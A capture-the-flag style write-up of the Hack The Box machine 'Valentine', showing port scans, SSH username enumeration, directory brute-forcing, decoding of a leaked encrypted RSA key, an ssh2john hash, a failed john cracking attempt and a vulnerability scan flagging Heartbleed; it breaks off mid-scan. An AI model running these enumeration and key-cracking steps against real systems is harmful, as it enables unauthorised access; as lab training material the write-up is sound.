---
title: "Valentine"
date: 2023-08-10T11:30:03+00:00
tags: ["web","linux","heartbleed"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: "/HTB/Valentine.png"
comments: false
description: "This is a friendly linux machine that has a web page vulnerable due to having an outdated version of OpenSSL."
---

## Room Information

- Room name: Valentine
- Difficulty level: Easy
- Room link: [https://app.hackthebox.com/machines/valentine](https://app.hackthebox.com/machines/valentine)

![Untitled](/HTB/Valentine.png)

## Tools Used

- Nmap
- searchsploit
- heartbleed.py
- ssh2john
- john
- base64
- xxd
- openssl rsa … (innecesary)

## Port Scanning

Other room, other port scan.

```ruby
# Nmap 7.94 scan initiated Mon Aug 28 07:29:53 2023 as: nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn -oN escaneo 10.10.10.79
Nmap scan report for 10.10.10.79
Host is up, received user-set (0.12s latency).
Scanned at 2023-08-28 07:29:54 EDT for 36s
Not shown: 65262 closed tcp ports (reset), 270 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAIMeSqrDdAOhxf7P1IDtdRqun0pO9pmUi+474hX6LHkDgC9dzcvEGyMB/cuuCCjfXn6QDd1n16dSE2zeKKjYT9RVCXJqfYvz/ROm82p0JasEdg1z6QHTeAv70XX6cVQAjAMQoUUdF7WWKWjQuAknb4uowunpQ0yGvy72rbFkSTmlAAAAFQDwWVA5vTpfj5pUCUNFyvnhy3TdcQAAAIBFqVHk74mIT3PWKSpWcZvllKCGg5rGCCE5B3jRWEbRo8CPRkwyPdi/hSaoiQYhvCIkA2CWFuAeedsZE6zMFVFVSsHxeMe55aCQclfMH4iuUZWrg0y5QREuRbGFM6DATJJFkg+PXG/OsLsba/BP8UfcuPM+WGWKxjuaoJt6jeD8iQAAAIBg9rgf8NoRfGqzi+3ndUCo9/m+T18pn+ORbCKdFGq8Ecs4QLeaXPMRIpCol11n6va090EISDPetHcaMaMcYOsFqO841K0O90BV8DhyU4JYBjcpslT+A2X+ahj2QJVGqZJSlusNAQ9vplWxofFONa+IUSGl1UsGjY0QGsA5l5ohfQ==
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRkMHjbGnQ7uoYx7HPJoW9Up+q0NriI5g5xAs1+0gYBVtBqPxi86gPtXbMHGSrpTiX854nsOPWA8UgfBOSZ2TgWeFvmcnRfUKJG9GR8sdIUvhKxq6ZOtUePereKr0bvFwMSl8Qtmo+KcRWvuxKS64RgUem2TVIWqStLJoPxt8iDPPM7929EoovpooSjwPfqvEhRMtq+KKlqU6PrJD6HshGdjLjABYY1ljfKakgBfWic+Y0KWKa9qdeBF09S7WlaUBWJ5SutKlNSwcRBBVbL4ZFcHijdlXCvfVwSVMkiqY7x4V4McsNpIzHyysZUADy8A6tbfSgopaeR2UN4QRgM1dX
|   256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+pCNI5Xv8P96CmyDi/EIvyL0LVZY2xAUJcA0G9rFdLJnIhjvmYuxoCQDsYl+LEiKQee5RRw9d+lgH3Fm5O9XI=
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Issuer: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2018-02-06T00:45:25
| Not valid after:  2019-02-06T00:45:25
| MD5:   a413:c4f0:b145:2154:fb54:b2de:c7a9:809d
| SHA-1: 2303:80da:60e7:bde7:2ba6:76dd:5214:3c3c:6f53:01b1
| -----BEGIN CERTIFICATE-----
| MIIDZzCCAk+gAwIBAgIJAIXsbfXFhLHyMA0GCSqGSIb3DQEBBQUAMEoxCzAJBgNV
| BAYTAlVTMQswCQYDVQQIDAJGTDEWMBQGA1UECgwNdmFsZW50aW5lLmh0YjEWMBQG
| A1UEAwwNdmFsZW50aW5lLmh0YjAeFw0xODAyMDYwMDQ1MjVaFw0xOTAyMDYwMDQ1
| MjVaMEoxCzAJBgNVBAYTAlVTMQswCQYDVQQIDAJGTDEWMBQGA1UECgwNdmFsZW50
| aW5lLmh0YjEWMBQGA1UEAwwNdmFsZW50aW5lLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMMoF6z4GSpB0oo/znkcGfT7SPrTLzNrb8ic+aO/GWao
| oY35ImIO4Z5FUB9ZL6y6lc+vI6pUyWRADyWoxd3LxByHDNJzEi53ds+JSPs5SuH1
| PUDDtZqCaPaNjLJNP08DCcC6rXRdU2SwV2pEDx+39vsFiK6ywcrepvvFZndGKXVg
| 0K+R3VkwOguPhSHlXcgiHFbqei8NJ1zip9YuVUYXhyLVG2ZiJYX6CRw4bRsUnql6
| 4DFNQybOsJHm0JtI2M9PefmvEkTUZeT/d0dWhU076a3bTestKZf4WpqZw60XGmxz
| pAQf5dWOqMemIK6K4FC48bLSSN59s4kNtuhtx6OCXpcCAwEAAaNQME4wHQYDVR0O
| BBYEFNzWWyJscuATyFWyfLR2Yev1T435MB8GA1UdIwQYMBaAFNzWWyJscuATyFWy
| fLR2Yev1T435MAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBACc3NjB7
| cHUXjTxwdeFxkY0EFYPPy3EiHftGVLpiczrEQ7NiHTLGQ6apvxdlShBBhKWRaU+N
| XGhsDkvBLUWJ3DSWwWM4pG9qmWPT241OCaaiIkVT4KcjRIc+x+91GWYNQvvdnFLO
| 5CfrRGkFHwJT1E6vGXJejx6nhTmis88ByQ9g9D2NgcHENfQPAW1by7ONkqiXtV3S
| q56X7q0yLQdSTe63dEzK8eSTN1KWUXDoNRfAYfHttJqKg2OUqUDVWkNzmUiIe4sP
| csAwIHShdX+Jd8E5oty5C07FJrzVtW+Yf4h8UHKLuJ4E8BYbkxkc5vDcXnKByeJa
| gRSFfyZx/VqBh9c=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-08-28T11:30:29+00:00; 0s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 0s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 28 07:30:30 2023 -- 1 IP address (1 host up) scanned in 36.42 seconds

===============================================================
2023/08/28 07:44:02 Finished
===============================================================
```

I found 3 open ports, 22(ssh), 80(http), 443(https). Let's focus on the website, but let's not forget that we can enumerate users due to the low version of ssh.

```ruby
┌──(kali㉿kali)-[~/HTB/valentine]
└─$ python2 ssh_enum.py 10.10.10.79 hype
/home/kali/.local/lib/python2.7/site-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
[+] hype is a valid username
```

## Enumeration

As I always do, I leave here the result of **gobuster** or **wfuzz**:

```ruby
┌──(kali㉿kali)-[~/HTB/valentine]
└─$ gobuster dir -u http://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.79/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/28 07:39:05 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 38]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]
/encode               (Status: 200) [Size: 554]
/decode               (Status: 200) [Size: 552]
/omg                  (Status: 200) [Size: 153356]
Progress: 78932 / 220561 (35.79%)[ERROR] 2023/08/28 07:40:54 [!] Get "http://10.10.10.79/19965": context deadli
eeded (Client.Timeout exceeded while awaiting headers)
/server-status        (Status: 403) [Size: 292]
Progress: 220267 / 220561 (99.87%)
```

When I saw this I quickly went to the /dev/ directory and saw that it contained a file named hype_key (in hexadecimal) which turned out to be an id_rsa supposedly from the user hype 😎

pd: to translate from hexadecimal to decimal I used a web page that I had already used on another machine before → [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MmQgMmQgMmQgMmQgMmQgNDIgNDUgNDcgNDkgNGUgMjAgNTIgNTMgNDEgMjAgNTAgNTIgNDkgNTYgNDEgNTQgNDUgMjAgNGIgNDUgNTkgMmQgMmQgMmQgMmQgMmQgMGQgMGEgNTAgNzIgNmYgNjMgMmQgNTQgNzkgNzAgNjUgM2EgMjAgMzQgMmMgNDUgNGUgNDMgNTIgNTkgNTAgNTQgNDUgNDQgMGQgMGEgNDQgNDUgNGIgMmQgNDkgNmUgNjYgNmYgM2EgMjAgNDEgNDUgNTMgMmQgMzEgMzIgMzggMmQgNDMgNDIgNDMgMmMgNDEgNDUgNDIgMzggMzggNDMgMzEgMzQgMzAgNDYgMzYgMzkgNDIgNDYgMzIgMzAgMzcgMzQgMzcgMzggMzggNDQgNDUgMzIgMzQgNDEgNDUgMzQgMzggNDQgMzQgMzYgMGQgMGEgMGQgMGEgNDQgNjIgNTAgNzIgNGYgMzcgMzggNmIgNjUgNjcgNGUgNzUgNmIgMzEgNDQgNDEgNzEgNmMgNDEgNGUgMzUgNmEgNjIgNmEgNTggNzYgMzAgNTAgNTAgNzMgNmYgNjcgMzMgNmEgNjQgNjIgNGQgNDYgNTMgMzggNjkgNDUgMzkgNzAgMzMgNTUgNGYgNGMgMzAgNmMgNDYgMzAgNzggNjYgMzcgNTAgN2EgNmQgNzIgNmIgNDQgNjEgMzggNTIgMGQgMGEgMzUgNzkgMmYgNjIgMzQgMzYgMmIgMzkgNmUgNDUgNzAgNDMgNGQgNjYgNTQgNTAgNjggNGUgNzUgNGEgNTIgNjMgNTcgMzIgNTUgMzIgNjcgNGEgNjMgNGYgNDYgNDggMmIgMzkgNTIgNGEgNDQgNDIgNDMgMzUgNTUgNGEgNGQgNTUgNTMgMzEgMmYgNjcgNmEgNDIgMmYgMzcgMmYgNGQgNzkgMzAgMzAgNGQgNzcgNzggMmIgNjEgNDkgMzYgMGQgMGEgMzAgNDUgNDkgMzAgNTMgNjIgNGYgNTkgNTUgNDEgNTYgMzEgNTcgMzQgNDUgNTYgMzcgNmQgMzkgMzYgNTEgNzMgNWEgNmEgNzIgNzcgNGEgNzYgNmUgNmEgNTYgNjEgNjYgNmQgMzYgNTYgNzMgNGIgNjEgNTQgNTAgNDIgNDggNzAgNzUgNjcgNjMgNDEgNTMgNzYgNGQgNzEgN2EgMzcgMzYgNTcgMzYgNjEgNjIgNTIgNWEgNjUgNTggNjkgMGQgMGEgNDUgNjIgNzcgMzYgMzYgNjggNmEgNDYgNmQgNDEgNzUgMzQgNDEgN2EgNzEgNjMgNGQgMmYgNmIgNjkgNjcgNGUgNTIgNDYgNTAgNTkgNzUgNGUgNjkgNTggNzIgNTggNzMgMzEgNzcgMmYgNjQgNjUgNGMgNDMgNzEgNDMgNGEgMmIgNDUgNjEgMzEgNTQgMzggN2EgNmMgNjEgNzMgMzYgNjYgNjMgNmQgNjggNGQgMzggNDEgMmIgMzggNTAgMGQgMGEgNGYgNTggNDIgNGIgNGUgNjUgMzYgNmMgMzEgMzcgNjggNGIgNjEgNTQgMzYgNzcgNDYgNmUgNzAgMzUgNjUgNTggNGYgNjEgNTUgNDkgNDggNzYgNDggNmUgNzYgNGYgMzYgNTMgNjMgNDggNTYgNTcgNTIgNzIgNWEgMzcgMzAgNjYgNjMgNzAgNjMgNzAgNjkgNmQgNGMgMzEgNzcgMzEgMzMgNTQgNjcgNjQgNjQgMzIgNDEgNjkgNDcgNjQgMGQgMGEgNzAgNDggNGMgNGEgNzAgNTkgNTUgNDkgNDkgMzUgNTAgNzUgNGYgMzYgNzggMmIgNGMgNTMgMzggNmUgMzEgNzIgMmYgNDcgNTcgNGQgNzEgNTMgNGYgNDUgNjkgNmQgNGUgNTIgNDQgMzEgNmEgMmYgMzUgMzkgMmYgMzQgNzUgMzMgNTIgNGYgNzIgNTQgNDMgNGIgNjUgNmYgMzkgNDQgNzMgNTQgNTIgNzEgNzMgMzIgNmIgMzEgNTMgNDggMGQgMGEgNTEgNjQgNTcgNzcgNDYgNzcgNjEgNTggNjIgNTkgNzkgNTQgMzEgNzUgNzggNDEgNGQgNTMgNmMgMzUgNDggNzEgMzkgNGYgNDQgMzUgNDggNGEgMzggNDcgMzAgNTIgMzYgNGEgNDkgMzUgNTIgNzYgNDMgNGUgNTUgNTEgNmEgNzcgNzggMzAgNDYgNDkgNTQgNmEgNmEgNGQgNmEgNmUgNGMgNDkgNzAgNzggNmEgNzYgNjYgNzEgMmIgNDUgMGQgMGEgNzAgMzAgNjcgNDQgMzAgNTUgNjMgNzkgNmMgNGIgNmQgMzYgNzIgNDMgNWEgNzEgNjEgNjMgNzcgNmUgNTMgNjQgNjQgNDggNTcgMzggNTcgMzMgNGMgNzggNGEgNmQgNDMgNzggNjQgNzggNTcgMzUgNmMgNzQgMzUgNjQgNTAgNmEgNDEgNmIgNDIgNTkgNTIgNTUgNmUgNmMgMzkgMzEgNDUgNTMgNDMgNjkgNDQgMzQgNWEgMmIgNzUgNDMgMGQgMGEgNGYgNmMgMzYgNmEgNGMgNDYgNDQgMzIgNmIgNjEgNGYgNGMgNjYgNzUgNzkgNjUgNjUgMzAgNjYgNTkgNDMgNjIgMzcgNDcgNTQgNzEgNGYgNjUgMzcgNDUgNmQgNGQgNDIgMzMgNjYgNDcgNDkgNzcgNTMgNjQgNTcgMzggNGYgNDMgMzggNGUgNTcgNTQgNmIgNzcgNzAgNmEgNjMgMzAgNDUgNGMgNjIgNmMgNTUgNjEgMzYgNzUgNmMgNGYgMGQgMGEgNzQgMzkgNjcgNzIgNTMgNmYgNzMgNTIgNTQgNDMgNzMgNWEgNjQgMzEgMzQgNGYgNTAgNzQgNzMgMzQgNjIgNGMgNzMgNzAgNGIgNzggNGQgNGQgNGYgNzMgNjcgNmUgNGIgNmMgNmYgNTggNzYgNmUgNmMgNTAgNGYgNTMgNzcgNTMgNzAgNTcgNzkgMzkgNTcgNzAgMzYgNzkgMzggNTggNTggMzggMmIgNDYgMzQgMzAgNzIgNzggNmMgMzUgMGQgMGEgNTggNzEgNjggNDQgNTUgNDIgNjggNzkgNmIgMzEgNDMgMzMgNTkgNTAgNGYgNjkgNDQgNzUgNTAgNGYgNmUgNGQgNTggNjEgNDkgNzAgNjUgMzEgNjQgNjcgNjIgMzAgNGUgNjQgNDQgMzEgNGQgMzkgNWEgNTEgNTMgNGUgNTUgNGMgNzcgMzEgNDQgNDggNDMgNDcgNTAgNTAgMzQgNGEgNTMgNTMgNzggNTggMzcgNDIgNTcgNjQgNDQgNGIgMGQgMGEgNjEgNDEgNmUgNTcgNGEgNzYgNDYgNjcgNmMgNDEgMzQgNmYgNDYgNDIgNDIgNTYgNDEgMzggNzUgNDEgNTAgNGQgNjYgNTYgMzIgNTggNDYgNTEgNmUgNmEgNzcgNTUgNTQgMzUgNjIgNTAgNGMgNDMgMzYgMzUgNzQgNDYgNzMgNzQgNmYgNTIgNzQgNTQgNWEgMzEgNzUgNTMgNzIgNzUgNjEgNjkgMzIgMzcgNmIgNzggNTQgNmUgNGMgNTEgMGQgMGEgMmIgNzcgNTEgMzggMzcgNmMgNGQgNjEgNjQgNjQgNzMgMzEgNDcgNTEgNGUgNjUgNDcgNzMgNGIgNTMgNjYgMzggNTIgMmYgNzIgNzMgNTIgNGIgNjUgNjUgNGIgNjMgNjkgNmMgNDQgNjUgNTAgNDMgNmEgNjUgNjEgNGMgNzEgNzQgNzEgNzggNmUgNjggNGUgNmYgNDYgNzQgNjcgMzAgNGQgNzggNzQgMzYgNzIgMzIgNjcgNjIgMzEgNDUgMGQgMGEgNDEgNmMgNmYgNTEgMzYgNmEgNjcgMzUgNTQgNjIgNmEgMzUgNGEgMzcgNzEgNzUgNTkgNTggNWEgNTAgNzkgNmMgNDIgNmMgNmEgNGUgNzAgMzkgNDcgNTYgNzAgNjkgNmUgNTAgNjMgMzMgNGIgNzAgNDggNzQgNzQgNzYgNjcgNjIgNzAgNzQgNjYgNjkgNTcgNDUgNDUgNzMgNWEgNTkgNmUgMzUgNzkgNWEgNTAgNjggNTUgNzIgMzkgNTEgMGQgMGEgNzIgMzAgMzggNzAgNmIgNGYgNzggNDEgNzIgNTggNDUgMzIgNjQgNmEgMzcgNjUgNTggMmIgNjIgNzEgMzYgMzUgMzYgMzMgMzUgNGYgNGEgMzYgNTQgNzEgNDggNjIgNDEgNmMgNTQgNTEgMzEgNTIgNzMgMzkgNTAgNzUgNmMgNzIgNTMgMzcgNGIgMzQgNTMgNGMgNTggMzcgNmUgNTkgMzggMzkgMmYgNTIgNWEgMzUgNmYgNTMgNTEgNjUgMGQgMGEgMzIgNTYgNTcgNTIgNzkgNTQgNWEgMzEgNDYgNjYgNmUgNjcgNGEgNTMgNzMgNzYgMzkgMmIgNGQgNjYgNzYgN2EgMzMgMzQgMzEgNmMgNjIgN2EgNGYgNDkgNTcgNmQgNmIgMzcgNTcgNjYgNDUgNjMgNTcgNjMgNDggNjMgMzEgMzYgNmUgMzkgNTYgMzAgNDkgNjIgNTMgNGUgNDEgNGMgNmUgNmEgNTQgNjggNzYgNDUgNjMgNTAgNmIgNzkgMGQgMGEgNjUgMzEgNDIgNzMgNjYgNTMgNjIgNzMgNjYgMzkgNDYgNjcgNzUgNTUgNWEgNmIgNjcgNDggNDEgNmUgNmUgNjYgNTIgNGIgNmIgNDcgNTYgNDcgMzEgNGYgNTYgNzkgNzUgNzcgNjMgMmYgNGMgNTYgNmEgNmQgNjIgNjggNWEgN2EgNGIgNzcgNGMgNjggNjEgNWEgNTIgNGUgNjQgMzggNDggNDUgNGQgMzggMzYgNjYgNGUgNmYgNmEgNTAgMGQgMGEgMzAgMzkgNmUgNTYgNmEgNTQgNjEgNTkgNzQgNTcgNTUgNTggNmIgMzAgNTMgNjkgMzEgNTcgMzAgMzIgNzcgNjIgNzUgMzEgNGUgN2EgNGMgMmIgMzEgNTQgNjcgMzkgNDkgNzAgNGUgNzkgNDkgNTMgNDYgNDMgNDYgNTkgNmEgNTMgNzEgNjkgNzkgNDcgMmIgNTcgNTUgMzcgNDkgNzcgNGIgMzMgNTkgNTUgMzUgNmIgNzAgMzMgNDMgNDMgMGQgMGEgNjQgNTkgNTMgNjMgN2EgMzYgMzMgNTEgMzIgNzAgNTEgNjEgNjYgNzggNjYgNTMgNjIgNzUgNzYgMzQgNDMgNGQgNmUgNGUgNzAgNjQgNjkgNzIgNTYgNGIgNDUgNmYgMzUgNmUgNTIgNTIgNjYgNGIgMmYgNjkgNjEgNGMgMzMgNTggMzEgNTIgMzMgNDQgNzggNTYgMzggNjUgNTMgNTkgNDYgNGIgNDYgNGMgMzYgNzAgNzEgNzAgNzUgNTggMGQgMGEgNjMgNTkgMzUgNTkgNWEgNGEgNDcgNDEgNzAgMmIgNGEgNzggNzMgNmUgNDkgNTEgMzkgNDMgNDYgNzkgNzggNDkgNzQgMzkgMzIgNjYgNzIgNTggN2EgNmUgNzMgNmEgNjggNmMgNTkgNjEgMzggNzMgNzYgNjIgNTYgNGUgNGUgNjYgNmIgMmYgMzkgNjYgNzkgNTggMzYgNmYgNzAgMzIgMzQgNzIgNGMgMzIgNDQgNzkgNDUgNTMgNzAgNTkgMGQgMGEgNzAgNmUgNzMgNzUgNmIgNDIgNDMgNDYgNDIgNmIgNWEgNDggNTcgNGUgNGUgNzkgNjUgNGUgMzcgNjIgMzUgNDcgNjggNTQgNTYgNDMgNmYgNjQgNDggNjggN2EgNDggNTYgNDYgNjUgNjggNTQgNzUgNDIgNzIgNzAgMmIgNTYgNzUgNTAgNzEgNjEgNzEgNDQgNzYgNGQgNDMgNTYgNjUgMzEgNDQgNWEgNDMgNjIgMzQgNGQgNmEgNDEgNmEgMGQgMGEgNGQgNzMgNmMgNjYgMmIgMzkgNzggNGIgMmIgNTQgNTggNDUgNGMgMzMgNjkgNjMgNmQgNDkgNGYgNDIgNTIgNjQgNTAgNzkgNzcgMzYgNjUgMmYgNGEgNmMgNTEgNmMgNTYgNTIgNmMgNmQgNTMgNjggNDYgNzAgNDkgMzggNjUgNjIgMmYgMzggNTYgNzMgNTQgNzkgNGEgNTMgNjUgMmIgNjIgMzggMzUgMzMgN2EgNzUgNTYgMzIgNzEgNGMgMGQgMGEgNzMgNzUgNGMgNjEgNDIgNGQgNzggNTkgNGIgNmQgMzMgMmIgN2EgNDUgNDQgNDkgNDQgNzYgNjUgNGIgNTAgNGUgNjEgNjEgNTcgNWEgNjcgNDUgNjMgNzEgNzggNzkgNmMgNDMgNDMgMmYgNzcgNTUgNzkgNTUgNTggNmMgNGQgNGEgMzUgMzAgNGUgNzcgMzYgNGEgNGUgNTYgNGQgNGQgMzggNGMgNjUgNDMgNjkgNjkgMzMgNGYgNDUgNTcgMGQgMGEgNmMgMzAgNmMgNmUgMzkgNGMgMzEgNjIgMmYgNGUgNTggNzAgNDggNmEgNDcgNjEgMzggNTcgNDggNDggNTQgNmEgNmYgNDkgNjkgNmMgNDIgMzUgNzEgNGUgNTUgNzkgNzkgNzcgNTMgNjUgNTQgNDIgNDYgMzIgNjEgNzcgNTIgNmMgNTggNDggMzkgNDIgNzIgNmIgNWEgNDcgMzQgNDYgNjMgMzQgNjcgNjQgNmQgNTcgMmYgNDkgN2EgNTQgMGQgMGEgNTIgNTUgNjcgNWEgNmIgNjIgNGQgNTEgNWEgNGUgNDkgNDkgNjYgN2EgNmEgMzEgNTEgNzUgNjkgNmMgNTIgNTYgNDIgNmQgMmYgNDYgMzcgMzYgNTkgMmYgNTkgNGQgNzIgNmQgNmUgNGQgMzkgNmIgMmYgMzEgNzggNTMgNDcgNDkgNzMgNmIgNzcgNDMgNTUgNTEgMmIgMzkgMzUgNDMgNDcgNDggNGEgNDUgMzggNGQgNmIgNjggNDQgMzMgMGQgMGEgMmQgMmQgMmQgMmQgMmQgNDUgNGUgNDQgMjAgNTIgNTMgNDEgMjAgNTAgNTIgNDkgNTYgNDEgNTQgNDUgMjAgNGIgNDUgNTkgMmQgMmQgMmQgMmQgMmQ)

![Untitled](/HTB/chef-valentine.png)

After this my first attempt was to try to connect via ssh, but the id_rsa was encrypted so I did the following to try to crack the hash:

```ruby
┌──(kali㉿kali)-[~/HTB/valentine]
└─$ ssh2john id_rsa               
id_rsa:$sshng$1$16$AEB88C140F69BF2074788DE24AE48D46$1200$0db3eb3bbf247a036e9350c0aa500
de636e35efd0f3eca20de375b3054bc884f69dd438bd25174c5fecfce6ae40daf11e72fdbe3afbd9c4a423
1f4cf84db8945c5b653680970e147fbd4490c10b95093144b5fe08c1ffbfcccb4d0cc31f9a23ad0423449b
3985005755b8115ee6f7a42c663af026f9e355a7e6e95b0a6933c11e9ba07004af32acfbe96e9a6d165e5e
211bc3aea18c5980bb8033a9c33f92280d4453d8b8d897ad7b35c3f75e2c2a8227e11ad53f3395ab3a7dc9
a133c03ef0f39704a35eea5d7b84a693eb0167a7979739a5081ef1e7bcee9270755646b67bd1f7297298a6
2f5c35dd381d77602219da472c9a585082393ee3bac7e2d2f27d6bfc658ca923848a63510f58ffe7dff8bb
744ead308a7a8f43b1346ab3693548741d5b01706976d8c93d6ec403129791eaf4e0f91c9f06d11e892394
6f08d5108f0c741484e38cc8e72c8a718ef7eaf84a74803d1473294a9baac266a69cc2749d7475bc5b72f1
2660b17715b996de5d3e30240584549e5f751120a20f867eb823a5ea32c50f691a38b7eec9e7b47d809bec
64ea39eec498c0777c623049d5bc382f0d593930a6373410b6e551aeae94eb7d82b4a8b114c2b19775e0e3
edb386cbb292b130c3ac8272a5a17be794f392c12a56cbd5a9eb2f175fcf85e34af19795ea843501872935
0b760f3a20ee3ce9cc5da2297b57606f435d0f533d65048d50bc350c70863cfe09492c57ec159d0ca6809d
626f160940e2814105503cb803cc7d5d971509e3c144f96cf2c2eb9b45b2da11b53675b92aee6a2dbb931
4e72d0fb043cee531a75db3519035e1ac2927fc47faec44a79e29c8a50de3c28de68baadab19e136816d83
4331b7aaf681bd44025a10ea38394db8f927baae61764fca50658cda7d195a629cf7372a91edb6f81ba6d7
e258412c6589f9c993e152bf50af4f2990ec40ad7136763ede5fe6eaeb9eb7e4e27a4ea1db0254d0d51b3d
3ee96b4bb2b848b5fb9d8f3dfd1679a1241ed95591c9367515f9e0252b2ff7e31fbf3df8d656f33885a693
b59f11c59c1dcd7a9fd57421b48d00b9e34e1bc470f9327b506c7d26ec7fd160b946648070279df44a9065
46d4e572bb073f2d58e66e16732b02e169944d77c1c433ce9f3688cfd3d9d58d3698b565179344a2d56d36
c1bbb53732fed5383d2293722121421588d2aa2c86f9653b2302b7614e64a7708275849ccfadd0da941a7f
17d26eebf808c9cda5d8ab54a128e674517cafe268bdd7d51dc3c55f1e49814a14bea9aa9b97718e586491
80a7e271b27210f42172c48b7dd9fad7ce7b2386561af2cbdb54d35f93ff5fc97ea8a76e2b2f60f2112a58
a67b2e90108506464758d37278dedbe46853542a1d1e1cc75457a14ee06ba7e56e3ea6aa0ef30255ed43642
6f832302332c95ffbdc4af935c42f789c98838145d3f2c3a7bf2654255519664a116923c79bffc56c4f225
27be6fce77cee576a8bb2e2da04cc582a6dfecc40c80ef78a3cd69a59980472ac729420bfc14c945e5309e
74370e8935530cf0b7828a2dce116974967f4bd5bfcd5e91e319af161c74e3a088a5079a8d532cb049e4c11
766b04655c7f41ae4646e0573881d996fc8cd345481991b31064d2087f38f542e8a5455066fc5efa63f60
cae69ccf64ff5c52188b24c02510fbde42187244f0c9210f7
```

Then I try to crack by brute force the hash, but I didn’t get any result 😢

```ruby
┌──(kali㉿kali)-[~/HTB/valentine]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:13 DONE (2023-08-29 18:22) 0g/s 1039Kp/s 1039Kc/s 1039KC/sa6_123..*7¡Vamos!
Session completed.
```

At this point many things started to go through my head, but what I did was the following, I went back to the web page and started to try things in the directories /decode/ and /encode/, I realized that they were vulnerable to XXS, I tried a lot of things but none of them worked, neither sql injection, nor php. After all this I decided to go back to the beginning and do again a scan with nmap and also pass the vulnerability scan `-script vuln`.

```ruby
┌──(kali㉿kali)-[~/HTB/valentine]
└─$ cat vulns     
# Nmap 7.94 scan initiated Tue Aug 29 08:04:30 2023 as: nmap --script vuln -p 80,22,443 -oN vulns 10.10.10.79
Nmap scan report for valentine.htb (10.10.10.79)
Host is up (0.16s latency).

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140407.txt 
|       http://cvedetails.com/cve/2014-0160/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
